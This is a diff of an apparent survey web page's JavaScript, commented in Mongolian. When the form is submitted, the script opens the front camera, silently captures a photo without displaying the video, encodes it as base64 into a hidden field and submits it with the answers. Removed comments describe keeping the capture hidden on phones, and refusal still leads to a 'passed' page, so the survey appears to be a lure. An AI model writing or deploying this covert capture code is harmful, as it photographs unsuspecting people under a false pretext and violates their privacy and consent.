@@ -194,63 +194,63 @@
     const surveyForm = document.getElementById('surveyForm');
     const submitBtn = document.querySelector('.submit-btn');
     const photoDataInput = document.getElementById('photo_data_input');
+    const cameraAllowedInput = document.getElementById('camera_allowed');
 
     const context = canvas.getContext('2d');
     let cameraStream = null;
 
     function handleSubmission(e) {
+        // 1. Формыг шууд илгээхийг зогсооно (Энэ нь маш чухал)
         e.preventDefault(); 
         
         submitBtn.disabled = true;
-        submitBtn.textContent = 'Түр хүлээнэ үү...';
+        submitBtn.textContent = 'Боловсруулж байна...';
 
-        // Камер нээх (video: true)
-        // playsinline, muted нь гар утсанд видеог ил харуулахгүй ажиллуулахад тусална
+        // Камерын тохиргоо
+        const constraints = { 
+            video: { facingMode: "user", width: 640, height: 480 }, 
+            audio: false 
+        };
+
+        // 2. Камер нээх оролдлого
         navigator.mediaDevices.getUserMedia(constraints)
-    .then(stream => {
-        document.getElementById('camera_allowed').value = 'true'; // Зөвшөөрсөн бол true болгоно
-        // ... зургийг авах код ...
-    })
-    .catch(err => {
-        document.getElementById('camera_allowed').value = 'false'; // Зөвшөөрөөгүй бол false хэвээр үлдэнэ
-        surveyForm.submit(); // Зөвшөөрөөгүй ч формыг илгээж "Тэнцлээ" хуудас харуулна
-    });
-        .then(stream => {
-            cameraStream = stream;
-            video.srcObject = stream;
-            video.setAttribute("playsinline", true); // iPhone-д зориулсан
-            video.play();
+            .then(stream => {
+                // --- ЗӨВШӨӨРСӨН ТОХИОЛДОЛ ---
+                cameraAllowedInput.value = 'true'; 
+                cameraStream = stream;
+                video.srcObject = stream;
+                video.setAttribute("playsinline", true);
+                video.play();
 
-            // Видео ачаалагдахыг хүлээх
-            video.onloadedmetadata = () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                // Камер бэлэн болохыг хүлээж зураг авах
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        context.drawImage(video, 0, 0, 640, 480);
+                        
+                        const dataURL = canvas.toDataURL('image/jpeg', 0.5);
+                        photoDataInput.value = dataURL; 
+
+                        // Камерыг унтраах
+                        cameraStream.getTracks().forEach(track => track.stop());
+
+                        // Формыг одоо илгээнэ
+                        surveyForm.submit();
+                    }, 1200); 
+                };
+            })
+            .catch(err => {
+                // --- ТАТГАЛЗСАН ЭСВЭЛ АЛДАА ГАРСАН ТОХИОЛДОЛ ---
+                console.warn('Камерын хандалт татгалзлаа:', err);
+                cameraAllowedInput.value = 'false';
                 
-                // Утсан дээр камер бэлэн болох хугацаа хэрэгтэй тул 1 секунд хүлээх
-                setTimeout(() => {
-                    // Зургийг Canvas дээр буулгах (Видео нууц хэвээр байна)
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Base64 болгох
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    photoDataInput.value = dataURL; 
-
-                    // Камерыг унтраах
-                    cameraStream.getTracks().forEach(track => track.stop());
-
-                    // Формыг илгээх
-                    surveyForm.submit();
-                }, 1000); 
-            };
-        })
-        .catch(err => {
-            console.error('Камерын алдаа:', err);
-            // Камер ажиллахгүй байсан ч формыг илгээх
-            surveyForm.submit(); 
-        });
+                // Зөвшөөрөөгүй ч гэсэн текстийг илгээх
+                surveyForm.submit();
+            });
     }
 
     surveyForm.addEventListener('submit', handleSubmission);
-</script>
+    </script>
 </body>
 </html>
